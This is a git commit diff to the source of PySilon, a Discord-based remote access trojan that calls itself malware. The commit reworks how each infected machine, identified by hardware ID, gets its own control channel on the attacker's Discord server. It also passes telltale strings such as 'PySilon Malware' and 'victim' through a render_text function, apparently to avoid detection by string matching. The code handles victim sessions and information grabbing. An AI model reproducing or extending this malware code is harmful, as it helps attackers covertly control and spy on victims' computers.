cfdfd25d8de64578146b30c6e37ae77eae2f2368
mategol <mateusz.golembowski.2002@gmail.com>
2024-08-16 12:15:53 +0200

    Changing structure a bit

--- resources/source.py
+++ resources/source.py
@@ -44,42 +44,29 @@ class PySilon(commands.Bot):
         for _ in guild_ids:
             for channel_name in self.get_guild(guild_id).channels:
                 if hwid in str(channel_name):
+                    self.channel = channel_name
                     return await self.sequent_run(channel_name)
             if guild_id_index != len(guild_ids)-1:
                 guild_id_index += 1
                 self.guild_id = guild_ids[guild_id_index]
             else: break
 
-        if channel_not_found:
-            for guild in guild_ids:
-                get_guild = self.get_guild(guild)
-                if len(get_guild.channels) < 499:
-                    self.guild_id = guild
-                    break
+        for guild in guild_ids:
+            get_guild = self.get_guild(guild)
+            if len(get_guild.channels) < 499:
+                self.guild_id = guild
+                break
 
         await self.first_run(guild_id, hwid)
 
     async def first_run(self, guild_id, hwid) -> None:
         self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
-        category = await self.get_guild(guild_id).create_category(hwid)
-        temp = await self.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
-        temp = await self.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
+        self.channel = await self.get_guild(guild_id).create_text_channel(f'{generate_channel_name()} [{hwid.replace('-', '')[::-1]}]')
 
-    async def sequent_run(self, category) -> None:
+    async def sequent_run(self, channel) -> None:
         self.fetch_working_dir()
         if self.working_directory == None or self.working_directory == []: self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
-        category_channel_names = []
-        for channel in category.channels:
-            category_channel_names.append(channel.name)
-
-        if 'main' not in category_channel_names and channel_ids['main']:
-            temp = await self.get_guild(self.guild_id).create_text_channel('main', category=category)
-            channel_ids['main'] = temp.id
-
-        if 'Live microphone' not in category_channel_names and channel_ids['live']:
-            temp = await self.get_guild(self.guild_id).create_voice_channel('Live microphone', category=category)
-            channel_ids['voice'] = temp.id
-
+        
     def load_bot(self, command_prefix, self_bot) -> None:
         commands.Bot.__init__(self, command_prefix=command_prefix, self_bot=self_bot, intents=discord.Intents.all())
 
@@ -91,16 +78,15 @@ class PySilon(commands.Bot):
     async def on_ready(self):
         await self.get_channel(self.channel_id).send('Bot is ready')
         await self.first_run_check()
-        await self.change_presence(activity=discord.Game(name='⭐ us on GitHub [pysilon.net]'))
-        await self.user.edit(username='PySilon Malware', avatar=urlopen('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/icons/default_icon.png').read())
+        await self.change_presence(activity=discord.Game(name=f'⭐ us on GitHub [{render_text('pysilon')}.net]'))
+        await self.user.edit(username=render_text('PySilon Malware'), avatar=urlopen('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/icons/default_icon.png').read())
 
         '''await self.get_channel(self.channel_id).send(embed=self.generate_embed(
             title='New session detected!',
-            description='A victim has turned up their PC!',
+            description=f'A {render_text('victim')} has turned up their PC!',
             color=0x34ebeb,
             fields=[['', grab_info().prepare_info(), False]],
             footer=['Please ⭐ our repository if you enjoy'],
-            url='https://github.com/mategol/PySilon-malware',
             author=[DEFAULT, DEFAULT]
         ))'''
 
@@ -132,7 +118,7 @@ class PySilon(commands.Bot):
                     for field in kwargs['fields']: embed.add_field(name=field[0], value=field[1], inline=field[2])
                 case 'thumbnail': embed.set_thumbnail(url=kwargs['thumbnail'])
                 case 'footer':
-                    footer_text = (kwargs['footer'] if kwargs['footer'] != DEFAULT else 'PySilon Malware') if type(kwargs['footer']) != list else (kwargs['footer'][0] if kwargs['footer'][0] != DEFAULT else 'https://github.com/mategol/PySilon-malware')
+                    footer_text = (kwargs['footer'] if kwargs['footer'] != DEFAULT else render_text('PySilon Malware')) if type(kwargs['footer']) != list else (kwargs['footer'][0] if kwargs['footer'][0] != DEFAULT else f'https://github.com/{render_text('mategol/PySilon-malware')}')
                     if type(kwargs['footer']) == list and len(kwargs['footer']) == 2: 
                         footer_icon = kwargs['footer'][1] if kwargs['footer'][1] != DEFAULT else 'https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/author_icon.jpg'
                         embed.set_footer(text=footer_text, icon_url=footer_icon)
@@ -141,7 +127,7 @@ class PySilon(commands.Bot):
                 case 'timestamp': embed.timestamp = kwargs['timestamp']
                 case 'image': embed.set_image(url=kwargs['image'])
                 case 'author':
-                    author_name = (kwargs['author'] if kwargs['author'] != DEFAULT else 'PySilon Malware') if type(kwargs['author']) != list else (kwargs['author'][0] if kwargs['author'][0] != DEFAULT else 'PySilon Malware')
+                    author_name = (kwargs['author'] if kwargs['author'] != DEFAULT else render_text('PySilon Malware')) if type(kwargs['author']) != list else (kwargs['author'][0] if kwargs['author'][0] != DEFAULT else render_text('PySilon Malware'))
                     if type(kwargs['author']) == list and len(kwargs['author']) == 2: 
                         author_icon = kwargs['author'][1] if kwargs['author'][1] != DEFAULT else 'https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/author_icon.jpg'
                         embed.set_author(name=author_name, icon_url=author_icon)
